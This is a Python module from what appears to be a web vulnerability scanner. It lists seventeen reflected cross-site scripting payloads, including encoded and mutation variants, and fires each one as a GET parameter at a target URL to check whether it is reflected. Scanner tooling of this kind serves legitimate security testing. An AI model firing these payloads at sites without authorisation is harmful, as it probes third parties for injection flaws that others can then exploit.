from core.http import fetch

XSS_PAYLOADS = [
    # Classic
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<iframe src=javascript:alert('XSS')>",
    "'><script>alert('XSS')</script>",
    "<body onload=alert('XSS')>",
    "<input type=text value=<script>alert('XSS')</script>>",
    "<details open ontoggle=alert('XSS')>",
    "<math><mi>x</mi><script>alert('XSS')</script></math>",
    "<svg><foreignObject><body onload=alert('XSS')></body></foreignObject></svg>",
    "<a href=javascript:alert('XSS')>click</a>",
    "<object data=javascript:alert('XSS')>",
    # Mutation & Encoding
    "<scr<script>ipt>alert(1)</script>",
    "%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
    "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
    "<sVG/onload=alert(1)>",
]

DEFAULT_PARAM = 'q'

def generate_tasks(url, config):
    tasks = []
    default_param = config.get('xss_param', DEFAULT_PARAM)
    discovered = config.get("discovered_params", [])
    all_params = list(dict.fromkeys([default_param] + discovered))
    
    limit = min(len(XSS_PAYLOADS), config.get('payloads', {}).get('xss', len(XSS_PAYLOADS)))
    for param in all_params:
        for payload in XSS_PAYLOADS[:limit]:
            tasks.append({
                'url': url,
                'method': 'GET',
                'params': {param: payload},
                'type': 'Reflected XSS',
                'executor': test_xss_reflected,
            })
    return tasks

async def test_xss_reflected(session, task):
    try:
        # Baseline
        text_base, _ = await fetch(session, task["url"], params={k: "apex_baseline_xss_check" for k in task["params"]})
        # Payload
        text, resp = await fetch(session, task['url'], params=task['params'])
        if resp and text:
            payload = next(iter(task['params'].values()))
            
            # Simple reflection
            reflected = payload in text
            # Decoded reflection
            try:
                from urllib.parse import unquote
                decoded_reflected = unquote(payload) in text
            except Exception:
                decoded_reflected = False
                
            is_reflected = reflected or decoded_reflected
            
            diff_len = abs(len(text) - len(text_base)) if text_base else 0
            
            vulnerable = is_reflected and diff_len > 0
            return {
                'type': 'Reflected XSS',
                'url': task['url'],
                'params': task['params'],
                'vulnerable': vulnerable,
                'response': text[:1000],
                'reflection': is_reflected,
            }
    except Exception as exc:
        return {'type': 'Reflected XSS', 'url': task['url'], 'error': str(exc), 'vulnerable': False}
    return {'type': 'Reflected XSS', 'url': task['url'], 'vulnerable': False}